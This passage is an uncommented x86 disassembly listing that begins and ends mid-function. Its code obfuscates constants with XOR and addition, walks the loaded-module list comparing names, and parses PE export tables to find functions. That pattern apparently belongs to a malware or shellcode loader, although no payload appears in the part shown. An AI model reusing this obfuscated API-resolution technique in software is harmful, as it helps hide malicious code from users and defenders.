  427e1f:	lea    ebx,[ecx+esi*1]
  427e22:	cmp    DWORD PTR [ebp+0x8],ebx
  427e25:	jb     0x427e33
  427e27:	mov    ebx,DWORD PTR [eax+0x8]
  427e2a:	add    ebx,ecx
  427e2c:	add    ebx,esi
  427e2e:	cmp    DWORD PTR [ebp+0x8],ebx
  427e31:	jb     0x427e3d
  427e33:	add    eax,0x28
  427e36:	inc    edi
  427e37:	cmp    edi,edx
  427e39:	jb     0x427e1c
  427e3b:	xor    eax,eax
  427e3d:	pop    edi
  427e3e:	pop    ebx
  427e3f:	pop    ebp
  427e40:	ret    0x4
  427e43:	push   ebp
  427e44:	mov    ebp,esp
  427e46:	sub    esp,0x34
  427e49:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427e50:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  427e57:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  427e5e:	mov    DWORD PTR [ebp-0x8],0xf89c85c2
  427e65:	mov    DWORD PTR [ebp-0x20],0xf89c85e2
  427e6c:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  427e73:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  427e7a:	mov    DWORD PTR [ebp-0x10],eax
  427e7d:	mov    eax,DWORD PTR [ebp+0x8]
  427e80:	mov    DWORD PTR [ebp-0x14],eax
  427e83:	mov    eax,DWORD PTR [ebp-0xc]
  427e86:	push   ebx
  427e87:	mov    ecx,0x75108ae
  427e8c:	xor    eax,ecx
  427e8e:	push   esi
  427e8f:	mov    esi,DWORD PTR [ebp-0x10]
  427e92:	mov    edx,0x3272f5
  427e97:	add    eax,edx
  427e99:	push   edi
  427e9a:	cmp    esi,eax
  427e9c:	je     0x42807b
  427ea2:	mov    eax,DWORD PTR [ebp-0xc]
  427ea5:	mov    esi,DWORD PTR [ebp-0x14]
  427ea8:	xor    eax,ecx
  427eaa:	add    eax,edx
  427eac:	cmp    esi,eax
  427eae:	je     0x42807b
  427eb4:	mov    eax,DWORD PTR [ebp-0xc]
  427eb7:	xor    eax,ecx
  427eb9:	add    eax,edx
  427ebb:	mov    DWORD PTR [ebp-0x24],eax
  427ebe:	mov    eax,DWORD PTR [ebp-0xc]
  427ec1:	xor    eax,ecx
  427ec3:	add    eax,edx
  427ec5:	mov    DWORD PTR [ebp-0x28],eax
  427ec8:	mov    edi,DWORD PTR [ebp-0x20]
  427ecb:	mov    ebx,DWORD PTR [ebp-0x8]
  427ece:	mov    esi,0x8ae
  427ed3:	xor    edi,esi
  427ed5:	mov    eax,0x72f5
  427eda:	xor    ebx,esi
  427edc:	add    edi,eax
  427ede:	add    ebx,eax
  427ee0:	sub    ebx,edi
  427ee2:	mov    WORD PTR [ebp-0x8],bx
  427ee6:	jmp    0x427fab
  427eeb:	mov    edi,DWORD PTR [ebp-0xc]
  427eee:	mov    bx,WORD PTR [ebp-0x4]
  427ef2:	xor    edi,esi
  427ef4:	add    edi,eax
  427ef6:	cmp    bx,di
  427ef9:	je     0x427fed
  427eff:	mov    edi,DWORD PTR [ebp-0xc]
  427f02:	mov    ebx,DWORD PTR [ebp+0xc]
  427f05:	xor    edi,ecx
  427f07:	add    edi,edx
  427f09:	cmp    ebx,edi
  427f0b:	mov    di,WORD PTR [ebp-0x4]
  427f0f:	mov    bx,WORD PTR [ebp+0x8]
  427f13:	je     0x427f7e
  427f15:	cmp    bx,di
  427f18:	je     0x427f87
  427f1a:	mov    edi,DWORD PTR [ebp-0x20]
  427f1d:	mov    bx,WORD PTR [ebp+0x8]
  427f21:	xor    edi,esi
  427f23:	add    edi,eax
  427f25:	cmp    bx,di
  427f28:	jb     0x427f48
  427f2a:	mov    edi,DWORD PTR [ebp-0x2c]
  427f2d:	mov    bx,WORD PTR [ebp+0x8]
  427f31:	xor    edi,esi
  427f33:	add    edi,eax
  427f35:	cmp    bx,di
  427f38:	ja     0x427f48
  427f3a:	movzx  edi,WORD PTR [ebp+0x8]
  427f3e:	movzx  ebx,WORD PTR [ebp-0x8]
  427f42:	add    edi,ebx
  427f44:	mov    WORD PTR [ebp+0x8],di
  427f48:	mov    edi,DWORD PTR [ebp-0x20]
  427f4b:	mov    bx,WORD PTR [ebp-0x4]
  427f4f:	xor    edi,esi
  427f51:	add    edi,eax
  427f53:	cmp    bx,di
  427f56:	jb     0x427f76
  427f58:	mov    edi,DWORD PTR [ebp-0x2c]
  427f5b:	mov    bx,WORD PTR [ebp-0x4]
  427f5f:	xor    edi,esi
  427f61:	add    edi,eax
  427f63:	cmp    bx,di
  427f66:	ja     0x427f76
  427f68:	movzx  edi,WORD PTR [ebp-0x4]
  427f6c:	movzx  ebx,WORD PTR [ebp-0x8]
  427f70:	add    edi,ebx
  427f72:	mov    WORD PTR [ebp-0x4],di
  427f76:	mov    di,WORD PTR [ebp-0x4]
  427f7a:	mov    bx,WORD PTR [ebp+0x8]
  427f7e:	cmp    bx,di
  427f81:	jne    0x42807b
  427f87:	mov    edi,DWORD PTR [ebp-0x1c]
  427f8a:	mov    ebx,DWORD PTR [ebp-0x10]
  427f8d:	xor    edi,ecx
  427f8f:	lea    edi,[edi+ebx*1+0x3272f5]
  427f96:	mov    DWORD PTR [ebp-0x10],edi
  427f99:	mov    edi,DWORD PTR [ebp-0x1c]
  427f9c:	mov    ebx,DWORD PTR [ebp-0x14]
  427f9f:	xor    edi,ecx
  427fa1:	lea    edi,[edi+ebx*1+0x3272f5]
  427fa8:	mov    DWORD PTR [ebp-0x14],edi
  427fab:	mov    edi,DWORD PTR [ebp-0x24]
  427fae:	mov    ebx,DWORD PTR [ebp-0x10]
  427fb1:	mov    di,WORD PTR [ebx+edi*2]
  427fb5:	mov    WORD PTR [ebp+0x8],di
  427fb9:	mov    edi,DWORD PTR [ebp-0x28]
  427fbc:	mov    ebx,DWORD PTR [ebp-0x14]
  427fbf:	mov    di,WORD PTR [ebx+edi*2]
  427fc3:	mov    WORD PTR [ebp-0x4],di
  427fc7:	mov    edi,DWORD PTR [ebp-0xc]
  427fca:	mov    bx,WORD PTR [ebp+0x8]
  427fce:	xor    edi,esi
  427fd0:	add    edi,eax
  427fd2:	cmp    bx,di
  427fd5:	jne    0x427eeb
  427fdb:	mov    eax,DWORD PTR [ebp-0x18]
  427fde:	mov    esi,DWORD PTR [ebp-0xc]
  427fe1:	xor    eax,ecx
  427fe3:	add    eax,edx
  427fe5:	imul   eax,esi
  427fe8:	mov    DWORD PTR [ebp-0xc],eax
  427feb:	jmp    0x427fff
  427fed:	mov    eax,DWORD PTR [ebp-0xc]
  427ff0:	mov    esi,DWORD PTR [ebp-0x18]
  427ff3:	xor    eax,ecx
  427ff5:	lea    eax,[eax+esi*1+0x3272f5]
  427ffc:	mov    DWORD PTR [ebp-0x18],eax
  427fff:	mov    eax,DWORD PTR [ebp-0x24]
  428002:	sub    eax,edx
  428004:	xor    eax,ecx
  428006:	mov    DWORD PTR [ebp-0x30],eax
  428009:	mov    eax,DWORD PTR [ebp-0x28]
  42800c:	sub    eax,edx
  42800e:	xor    eax,ecx
  428010:	mov    DWORD PTR [ebp-0x34],eax
  428013:	mov    eax,DWORD PTR [ebp-0x34]
  428016:	mov    esi,DWORD PTR [ebp-0x1c]
  428019:	xor    esi,ecx
  42801b:	add    esi,edx
  42801d:	xor    eax,ecx
  42801f:	add    eax,0x3272f5
  428024:	imul   esi,eax
  428027:	mov    eax,DWORD PTR [ebp-0x14]
  42802a:	movzx  eax,WORD PTR [esi+eax*1]
  42802e:	mov    esi,DWORD PTR [ebp-0x30]
  428031:	mov    edi,DWORD PTR [ebp-0x1c]
  428034:	xor    esi,ecx
  428036:	add    esi,edx
  428038:	xor    edi,ecx
  42803a:	add    edi,edx
  42803c:	imul   edi,esi
  42803f:	mov    esi,DWORD PTR [ebp-0x10]
  428042:	movzx  esi,WORD PTR [edi+esi*1]
  428046:	sub    eax,edx
  428048:	sub    esi,edx
  42804a:	xor    eax,ecx
  42804c:	xor    esi,ecx
  42804e:	cmp    esi,eax
  428050:	jne    0x42807b
  428052:	mov    eax,DWORD PTR [ebp-0x30]
  428055:	mov    esi,DWORD PTR [ebp-0x1c]
  428058:	xor    eax,ecx
  42805a:	add    eax,0x3272f5
  42805f:	xor    esi,ecx
  428061:	add    esi,edx
  428063:	imul   esi,eax
  428066:	mov    eax,DWORD PTR [ebp-0x10]
  428069:	movzx  eax,WORD PTR [esi+eax*1]
  42806d:	mov    esi,DWORD PTR [ebp-0xc]
  428070:	sub    eax,edx
  428072:	xor    eax,ecx
  428074:	cmp    eax,esi
  428076:	mov    eax,DWORD PTR [ebp-0xc]
  428079:	je     0x42807e
  42807b:	mov    eax,DWORD PTR [ebp-0x18]
  42807e:	pop    edi
  42807f:	xor    eax,ecx
  428081:	pop    esi
  428082:	add    eax,edx
  428084:	pop    ebx
  428085:	leave  
  428086:	ret    0x8
  428089:	push   ebp
  42808a:	mov    ebp,esp
  42808c:	push   ecx
  42808d:	mov    cx,WORD PTR [eax]
  428090:	push   esi
  428091:	mov    esi,0x3b5c
  428096:	sub    cx,si
  428099:	mov    esi,0x8a9a
  42809e:	xor    cx,si
  4280a1:	mov    esi,0x4e3e
  4280a6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4280ad:	mov    edx,0xf89c85a5
  4280b2:	cmp    cx,si
  4280b5:	je     0x428114
  4280b7:	push   ebx
  4280b8:	push   edi
  4280b9:	movzx  ecx,cx
  4280bc:	mov    edi,0xffcd8d0b
  4280c1:	mov    esi,0x75108ae
  4280c6:	mov    ebx,0x4f9a
  4280cb:	cmp    cx,bx
  4280ce:	jne    0x4280d3
  4280d0:	mov    DWORD PTR [ebp-0x4],edx
  4280d3:	lea    edx,[edi+0x1]
  4280d6:	xor    edx,esi
  4280d8:	mov    edi,edx
  4280da:	xor    edi,esi
  4280dc:	mov    cx,WORD PTR [eax+edi*2+0x64e5ea]
  4280e4:	mov    ebx,0x3b5c
  4280e9:	sub    cx,bx
  4280ec:	mov    ebx,0x8a9a
  4280f1:	xor    cx,bx
  4280f4:	mov    ebx,0x4e3e
  4280f9:	cmp    cx,bx
  4280fc:	jne    0x4280c6
  4280fe:	mov    ecx,DWORD PTR [ebp-0x4]
  428101:	pop    edi
  428102:	pop    ebx
  428103:	cmp    ecx,0xf89c85a4
  428109:	je     0x428114
  42810b:	xor    ecx,esi
  42810d:	lea    eax,[eax+ecx*2+0x64e5ec]
  428114:	pop    esi
  428115:	leave  
  428116:	ret    
  428117:	push   ebp
  428118:	mov    ebp,esp
  42811a:	push   ecx
  42811b:	push   esi
  42811c:	push   edi
  42811d:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  428124:	mov    esi,0xf89c85a5
  428129:	call   0x428089
  42812e:	mov    edi,eax
  428130:	mov    al,BYTE PTR [edi]
  428132:	sub    al,0x3
  428134:	xor    al,0x7e
  428136:	cmp    al,0x83
  428138:	je     0x42819b
  42813a:	mov    eax,edi
  42813c:	mov    edx,0xffcd8d0b
  428141:	mov    ecx,0x75108ae
  428146:	push   ebx
  428147:	mov    ax,WORD PTR [eax]
  42814a:	mov    ebx,0x3b5c
  42814f:	sub    ax,bx
  428152:	mov    ebx,0x8a9a
  428157:	xor    ax,bx
  42815a:	mov    ebx,0x4e48
  42815f:	cmp    ax,bx
  428162:	jne    0x428167
  428164:	mov    DWORD PTR [ebp-0x4],esi
  428167:	lea    esi,[edx+0x1]
  42816a:	xor    esi,ecx
  42816c:	mov    edx,esi
  42816e:	xor    edx,ecx
  428170:	lea    eax,[edi+edx*2+0x64e5ea]
  428177:	mov    bl,BYTE PTR [eax]
  428179:	sub    bl,0x3
  42817c:	xor    bl,0x7e
  42817f:	cmp    bl,0x83
  428182:	jne    0x428147
  428184:	mov    eax,DWORD PTR [ebp-0x4]
  428187:	pop    ebx
  428188:	cmp    eax,0xf89c85a4
  42818d:	je     0x42819b
  42818f:	xor    eax,ecx
  428191:	xor    ecx,ecx
  428193:	mov    WORD PTR [edi+eax*2+0x64e5ea],cx
  42819b:	mov    eax,edi
  42819d:	pop    edi
  42819e:	pop    esi
  42819f:	leave  
  4281a0:	ret    
  4281a1:	push   ebp
  4281a2:	mov    ebp,esp
  4281a4:	push   ecx
  4281a5:	push   esi
  4281a6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4281ad:	mov    esi,0xf89c85a5
  4281b2:	call   0x428089
  4281b7:	mov    cx,WORD PTR [eax]
  4281ba:	mov    edx,0x3b5c
  4281bf:	sub    cx,dx
  4281c2:	mov    edx,0x8a9a
  4281c7:	xor    cx,dx
  4281ca:	mov    edx,0x4e3e
  4281cf:	cmp    cx,dx
  4281d2:	je     0x42822b
  4281d4:	push   ebx
  4281d5:	push   edi
  4281d6:	movzx  ecx,cx
  4281d9:	mov    edx,0xffcd8d0b
  4281de:	mov    edi,0x75108ae
  4281e3:	mov    ebx,0x4e48
  4281e8:	cmp    cx,bx
  4281eb:	jne    0x4281f0
  4281ed:	mov    DWORD PTR [ebp-0x4],esi
  4281f0:	lea    esi,[edx+0x1]
  4281f3:	xor    esi,edi
  4281f5:	mov    edx,esi
  4281f7:	xor    edx,edi
  4281f9:	mov    cx,WORD PTR [eax+edx*2+0x64e5ea]
  428201:	mov    ebx,0x3b5c
  428206:	sub    cx,bx
  428209:	mov    ebx,0x8a9a
  42820e:	xor    cx,bx
  428211:	mov    ebx,0x4e3e
  428216:	cmp    cx,bx
  428219:	jne    0x4281e3
  42821b:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  428222:	pop    edi
  428223:	pop    ebx
  428224:	je     0x42822b
  428226:	xor    eax,eax
  428228:	inc    eax
  428229:	jmp    0x42822d
  42822b:	xor    eax,eax
  42822d:	pop    esi
  42822e:	leave  
  42822f:	ret    
  428230:	push   ebp
  428231:	mov    ebp,esp
  428233:	push   ecx
  428234:	mov    eax,DWORD PTR [ebp+0x8]
  428237:	movzx  ecx,WORD PTR [eax]
  42823a:	push   esi
  42823b:	lea    eax,[ecx-0x3b5c]
  428241:	mov    esi,0x8a9a
  428246:	push   edi
  428247:	xor    eax,esi
  428249:	mov    edi,0x4e3e
  42824e:	mov    DWORD PTR [ebp-0x4],edx
  428251:	cmp    ax,di
  428254:	je     0x428281
  428256:	mov    eax,DWORD PTR [ebp+0x8]
  428259:	sub    eax,edx
  42825b:	mov    DWORD PTR [ebp+0x8],eax
  42825e:	jmp    0x428263
  428260:	mov    eax,DWORD PTR [ebp+0x8]
  428263:	mov    WORD PTR [edx],cx
  428266:	add    edx,0x2
  428269:	movzx  edi,WORD PTR [eax+edx*1]
  42826d:	mov    ecx,edi
  42826f:	add    edi,0xffffc4a4
  428275:	xor    edi,esi
  428277:	mov    eax,0x4e3e
  42827c:	cmp    di,ax
  42827f:	jne    0x428260
  428281:	xor    eax,eax
  428283:	pop    edi
  428284:	mov    WORD PTR [edx],ax
  428287:	mov    eax,DWORD PTR [ebp-0x4]
  42828a:	pop    esi
  42828b:	leave  
  42828c:	ret    0x4
  42828f:	push   ebp
  428290:	mov    ebp,esp
  428292:	sub    esp,0x18
  428295:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  42829c:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  4282a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282a6:	push   esi
  4282a7:	mov    eax,0x75108ae
  4282ac:	xor    ecx,eax
  4282ae:	mov    esi,0x3272f5
  4282b3:	add    ecx,esi
  4282b5:	mov    DWORD PTR [ebp-0x4],ecx
  4282b8:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4282bf:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4282c6:	push   edi
  4282c7:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  4282ce:	jmp    0x42836f
  4282d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4282d6:	mov    edx,DWORD PTR [ebp+0x10]
  4282d9:	sub    edx,ecx
  4282db:	mov    ecx,DWORD PTR [ebp-0xc]
  4282de:	xor    ecx,eax
  4282e0:	add    ecx,esi
  4282e2:	cmp    edx,ecx
  4282e4:	jbe    0x428301
  4282e6:	mov    edx,DWORD PTR [ebp-0x4]
  4282e9:	add    edx,DWORD PTR [ebp+0x8]
  4282ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4282ef:	add    ecx,DWORD PTR [ebp+0xc]
  4282f2:	mov    edi,DWORD PTR [ecx]
  4282f4:	mov    DWORD PTR [edx],edi
  4282f6:	mov    ecx,DWORD PTR [ecx+0x4]
  4282f9:	mov    DWORD PTR [edx+0x4],ecx
  4282fc:	mov    ecx,DWORD PTR [ebp-0xc]
  4282ff:	jmp    0x42834e
  428301:	mov    ecx,DWORD PTR [ebp-0x4]
  428304:	mov    edx,DWORD PTR [ebp+0x10]
  428307:	sub    edx,ecx
  428309:	mov    ecx,DWORD PTR [ebp-0x10]
  42830c:	xor    ecx,eax
  42830e:	add    ecx,esi
  428310:	cmp    edx,ecx
  428312:	mov    ecx,DWORD PTR [ebp-0x4]
  428315:	jbe    0x428329
  428317:	add    ecx,DWORD PTR [ebp+0x8]
  42831a:	mov    edx,DWORD PTR [ebp-0x4]
  42831d:	add    edx,DWORD PTR [ebp+0xc]
  428320:	mov    edx,DWORD PTR [edx]
  428322:	mov    DWORD PTR [ecx],edx
  428324:	mov    ecx,DWORD PTR [ebp-0x10]
  428327:	jmp    0x42834e
  428329:	mov    edx,DWORD PTR [ebp+0x10]
  42832c:	sub    edx,ecx
  42832e:	mov    ecx,DWORD PTR [ebp-0x14]
  428331:	xor    ecx,eax
  428333:	add    ecx,esi
  428335:	cmp    edx,ecx
  428337:	mov    ecx,DWORD PTR [ebp-0x4]
  42833a:	jbe    0x42835f
  42833c:	add    ecx,DWORD PTR [ebp+0x8]
  42833f:	mov    edx,DWORD PTR [ebp-0x4]
  428342:	add    edx,DWORD PTR [ebp+0xc]
  428345:	mov    dx,WORD PTR [edx]
  428348:	mov    WORD PTR [ecx],dx
  42834b:	mov    ecx,DWORD PTR [ebp-0x14]
  42834e:	mov    edx,DWORD PTR [ebp-0x4]
  428351:	xor    ecx,eax
  428353:	lea    ecx,[ecx+edx*1+0x3272f5]
  42835a:	mov    DWORD PTR [ebp-0x4],ecx
  42835d:	jmp    0x42836f
  42835f:	add    ecx,DWORD PTR [ebp+0x8]
  428362:	mov    edx,DWORD PTR [ebp-0x4]
  428365:	add    edx,DWORD PTR [ebp+0xc]
  428368:	mov    dl,BYTE PTR [edx]
  42836a:	mov    BYTE PTR [ecx],dl
  42836c:	inc    DWORD PTR [ebp-0x4]
  42836f:	mov    ecx,DWORD PTR [ebp-0x18]
  428372:	mov    edx,DWORD PTR [ebp+0x10]
  428375:	xor    ecx,eax
  428377:	add    ecx,esi
  428379:	imul   ecx,edx
  42837c:	mov    edx,DWORD PTR [ebp-0x8]
  42837f:	mov    edi,DWORD PTR [ebp-0x4]
  428382:	xor    edx,eax
  428384:	lea    edx,[edx+edi*1+0x3272f5]
  42838b:	cmp    edx,ecx
  42838d:	jb     0x4282d3
  428393:	pop    edi
  428394:	pop    esi
  428395:	leave  
  428396:	ret    0xc
  428399:	push   ebp
  42839a:	mov    ebp,esp
  42839c:	sub    esp,0xc
  42839f:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4283a6:	push   esi
  4283a7:	mov    esi,eax
  4283a9:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4283b0:	mov    edx,DWORD PTR [ebp-0x4]
  4283b3:	mov    eax,0x75108ae
  4283b8:	xor    edx,eax
  4283ba:	mov    ecx,0x3272f5
  4283bf:	add    edx,ecx
  4283c1:	cmp    esi,edx
  4283c3:	je     0x428405
  4283c5:	push   ebx
  4283c6:	push   edi
  4283c7:	mov    edx,DWORD PTR [ebp-0x8]
  4283ca:	mov    ebx,DWORD PTR [ebp+0x8]
  4283cd:	xor    edx,eax
  4283cf:	mov    edi,0xffcd8d0b
  4283d4:	sub    edi,edx
  4283d6:	add    esi,edi
  4283d8:	lea    edx,[esi-0x3272f5]
  4283de:	xor    edx,eax
  4283e0:	mov    DWORD PTR [ebp-0xc],edx
  4283e3:	mov    edx,DWORD PTR [ebp-0x4]
  4283e6:	mov    edi,DWORD PTR [ebp-0xc]
  4283e9:	xor    dl,0xae
  4283ec:	sub    dl,0xb
  4283ef:	xor    edi,eax
  4283f1:	mov    BYTE PTR [edi+ebx*1+0x3272f5],dl
  4283f8:	mov    edx,DWORD PTR [ebp-0x4]
  4283fb:	xor    edx,eax
  4283fd:	add    edx,ecx
  4283ff:	cmp    esi,edx
  428401:	jne    0x4283c7
  428403:	pop    edi
  428404:	pop    ebx
  428405:	pop    esi
  428406:	leave  
  428407:	ret    0x4
  42840a:	push   ebp
  42840b:	mov    ebp,esp
  42840d:	sub    esp,0x21c
  428413:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42841a:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  428421:	mov    eax,DWORD PTR [ebp+0x10]
  428424:	mov    eax,DWORD PTR [ebp-0x4]
  428427:	mov    ecx,DWORD PTR [ebp+0x8]
  42842a:	push   esi
  42842b:	push   edi
  42842c:	mov    edi,0x75108ae
  428431:	xor    eax,edi
  428433:	mov    esi,0x3272f5
  428438:	add    eax,esi
  42843a:	cmp    eax,ecx
  42843c:	mov    eax,DWORD PTR [ebp-0x4]
  42843f:	jne    0x42844a
  428441:	xor    eax,edi
  428443:	add    eax,esi
  428445:	jmp    0x4284f6
  42844a:	mov    ecx,DWORD PTR [ebp+0xc]
  42844d:	xor    eax,edi
  42844f:	add    eax,esi
  428451:	cmp    eax,ecx
  428453:	jne    0x42845a
  428455:	mov    eax,DWORD PTR [ebp-0x4]
  428458:	jmp    0x428441
  42845a:	lea    eax,[ebp-0x21c]
  428460:	mov    DWORD PTR [ebp-0x8],eax
  428463:	mov    eax,DWORD PTR [ebp+0xc]
  428466:	mov    DWORD PTR [ebp-0x10],eax
  428469:	mov    eax,DWORD PTR [ebp-0x4]
  42846c:	xor    eax,edi
  42846e:	add    eax,esi
  428470:	mov    DWORD PTR [ebp+0x10],eax
  428473:	mov    eax,DWORD PTR [ebp+0xc]
  428476:	push   ebx
  428477:	call   0x4281a1
  42847c:	mov    ebx,eax
  42847e:	mov    eax,DWORD PTR [ebp+0x8]
  428481:	mov    eax,DWORD PTR [eax+0x14]
  428484:	jmp    0x4284de
  428486:	mov    eax,DWORD PTR [ebp+0xc]
  428489:	sub    eax,0x8
  42848c:	mov    DWORD PTR [ebp-0xc],eax
  42848f:	mov    eax,DWORD PTR [ebp-0xc]
  428492:	mov    eax,DWORD PTR [eax+0x28]
  428495:	call   0x428089
  42849a:	mov    DWORD PTR [ebp+0x10],eax
  42849d:	push   DWORD PTR [ebp+0x10]
  4284a0:	mov    edx,DWORD PTR [ebp-0x8]
  4284a3:	call   0x428230
  4284a8:	mov    eax,DWORD PTR [ebp-0x4]
  4284ab:	xor    eax,edi
  4284ad:	add    eax,esi
  4284af:	cmp    eax,ebx
  4284b1:	jne    0x4284bb
  4284b3:	mov    eax,DWORD PTR [ebp-0x8]
  4284b6:	call   0x428117
  4284bb:	mov    eax,DWORD PTR [ebp-0x14]
  4284be:	xor    eax,edi
  4284c0:	add    eax,esi
  4284c2:	push   eax
  4284c3:	push   DWORD PTR [ebp-0x10]
  4284c6:	mov    eax,DWORD PTR [ebp-0x8]
  4284c9:	call   0x427e43
  4284ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4284d1:	xor    ecx,edi
  4284d3:	add    ecx,esi
  4284d5:	cmp    eax,ecx
  4284d7:	je     0x4284fc
  4284d9:	mov    eax,DWORD PTR [ebp+0xc]
  4284dc:	mov    eax,DWORD PTR [eax]
  4284de:	mov    DWORD PTR [ebp+0xc],eax
  4284e1:	mov    eax,DWORD PTR [ebp+0x8]
  4284e4:	mov    ecx,DWORD PTR [ebp+0xc]
  4284e7:	add    eax,0x14
  4284ea:	cmp    ecx,eax
  4284ec:	jne    0x428486
  4284ee:	mov    eax,DWORD PTR [ebp-0x4]
  4284f1:	xor    eax,edi
  4284f3:	add    eax,esi
  4284f5:	pop    ebx
  4284f6:	pop    edi
  4284f7:	pop    esi
  4284f8:	leave  
  4284f9:	ret    0xc
  4284fc:	mov    eax,DWORD PTR [ebp-0xc]
  4284ff:	mov    eax,DWORD PTR [eax+0x18]
  428502:	jmp    0x4284f5
  428504:	push   ebp
  428505:	mov    ebp,esp
  428507:	mov    eax,DWORD PTR [ebp+0xc]
  42850a:	sub    esp,0x10
  42850d:	cmp    DWORD PTR [ebp+0x8],0x0
  428511:	push   ebx
  428512:	push   esi
  428513:	push   edi
  428514:	je     0x4285c9
  42851a:	test   eax,eax
  42851c:	je     0x4285c9
  428522:	movzx  eax,WORD PTR [eax+0x20]
  428526:	mov    ecx,eax
  428528:	mov    DWORD PTR [ebp-0x10],eax
  42852b:	xor    edx,edx
  42852d:	and    DWORD PTR [ebp-0x8],edx
  428530:	mov    eax,0x8a9a
  428535:	xor    ecx,eax
  428537:	add    ecx,0x3b5c
  42853d:	mov    DWORD PTR [ebp-0xc],ecx
  428540:	and    DWORD PTR [ebp-0x4],0x0
  428544:	xor    ecx,ecx
  428546:	push   0xffffff81
  428548:	pop    edi
  428549:	cmp    cx,WORD PTR [ebp-0xc]
  42854d:	jae    0x4285b3
  42854f:	lea    esi,[edx-0x3b5c]
  428555:	xor    esi,eax
  428557:	movzx  ecx,WORD PTR [ebp-0x4]
  42855b:	mov    ebx,DWORD PTR [ebp+0xc]
  42855e:	lea    ecx,[ebx+ecx*4]
  428561:	cmp    WORD PTR [ecx+0x2],si
  428565:	jne    0x42859e
  428567:	movzx  ecx,WORD PTR [ecx]
  42856a:	mov    edi,0x4e3e
  42856f:	cmp    cx,di
  428572:	jne    0x428580
  428574:	mov    ebx,DWORD PTR [ebp+0x8]
  428577:	movzx  edi,dx
  42857a:	cmp    BYTE PTR [edi+ebx*1],0x0
  42857e:	je     0x4285ad
  428580:	mov    ebx,DWORD PTR [ebp+0x8]
  428583:	movzx  edi,dx
  428586:	movsx  di,BYTE PTR [edi+ebx*1]
  42858b:	mov    ebx,0x3b5c
  428590:	sub    di,bx
  428593:	xor    di,ax
  428596:	cmp    cx,di
  428599:	je     0x4285ad
  42859b:	push   0xffffff83
  42859d:	pop    edi
  42859e:	inc    DWORD PTR [ebp-0x4]
  4285a1:	mov    cx,WORD PTR [ebp-0xc]
  4285a5:	cmp    WORD PTR [ebp-0x4],cx
  4285a9:	jb     0x428557
  4285ab:	jmp    0x4285b3
  4285ad:	inc    DWORD PTR [ebp-0x8]
  4285b0:	push   0xffffff80
  4285b2:	pop    edi
  4285b3:	mov    esi,DWORD PTR [ebp+0x8]
  4285b6:	movzx  ecx,dx
  4285b9:	cmp    BYTE PTR [ecx+esi*1],0x0
  4285bd:	je     0x4285d2
  4285bf:	inc    edx
  4285c0:	cmp    edi,0xffffff83
  4285c3:	jne    0x428540
  4285c9:	xor    eax,eax
  4285cb:	pop    edi
  4285cc:	pop    esi
  4285cd:	pop    ebx
  4285ce:	leave  
  4285cf:	ret    0x8
  4285d2:	mov    ecx,DWORD PTR [ebp-0x8]
  4285d5:	add    ecx,0xffffc4a4
  4285db:	xor    cx,ax
  4285de:	xor    eax,eax
  4285e0:	cmp    cx,WORD PTR [ebp-0x10]
  4285e4:	sete   al
  4285e7:	jmp    0x4285cb
  4285e9:	push   ebp
  4285ea:	mov    ebp,esp
  4285ec:	sub    esp,0x50
  4285ef:	push   edi
  4285f0:	mov    edi,eax
  4285f2:	mov    eax,DWORD PTR [edi+0x1a8]
  4285f8:	cmp    DWORD PTR [eax],0x0
  4285fb:	jne    0x428604
  4285fd:	xor    eax,eax
  4285ff:	jmp    0x428735
  428604:	push   DWORD PTR [ebp+0x8]
  428607:	push   0x2c
  428609:	pop    eax
  42860a:	call   0x428399
  42860f:	mov    edx,DWORD PTR [edi+0x1ac]
  428615:	lea    eax,[edi+0x22]
  428618:	mov    DWORD PTR [ebp-0x4c],eax
  42861b:	lea    eax,[edi+0x44]
  42861e:	mov    DWORD PTR [ebp-0x48],eax
  428621:	lea    eax,[edi+0x66]
  428624:	mov    DWORD PTR [ebp-0x44],eax
  428627:	lea    eax,[edi+0x88]
  42862d:	mov    DWORD PTR [ebp-0x40],eax
  428630:	lea    eax,[edi+0xaa]
  428636:	mov    DWORD PTR [ebp-0x3c],eax
  428639:	lea    eax,[edi+0xcc]
  42863f:	mov    DWORD PTR [ebp-0x38],eax
  428642:	lea    eax,[edi+0xee]
  428648:	mov    DWORD PTR [ebp-0x34],eax
  42864b:	lea    eax,[edi+0x110]
  428651:	mov    DWORD PTR [ebp-0x30],eax
  428654:	lea    eax,[edi+0x132]
  42865a:	mov    DWORD PTR [ebp-0x2c],eax
  42865d:	lea    eax,[edi+0x154]
  428663:	push   edi
  428664:	mov    DWORD PTR [ebp-0x50],edi
  428667:	mov    DWORD PTR [ebp-0x28],eax
  42866a:	call   0x428769
  42866f:	push   eax
  428670:	mov    eax,DWORD PTR [edi+0x1a8]
  428676:	push   DWORD PTR [eax]
  428678:	call   0x42840a
  42867d:	mov    DWORD PTR [ebp-0x10],eax
  428680:	test   eax,eax
  428682:	je     0x428735
  428688:	mov    ecx,DWORD PTR [eax+0x3c]
  42868b:	push   ebx
  42868c:	push   esi
  42868d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428691:	add    esi,eax
  428693:	mov    edi,DWORD PTR [esi+0x24]
  428696:	mov    ecx,DWORD PTR [esi+0x1c]
  428699:	mov    edx,DWORD PTR [esi+0x20]
  42869c:	mov    ebx,DWORD PTR [esi+0x18]
  42869f:	add    edi,eax
  4286a1:	mov    DWORD PTR [ebp-0x20],edi
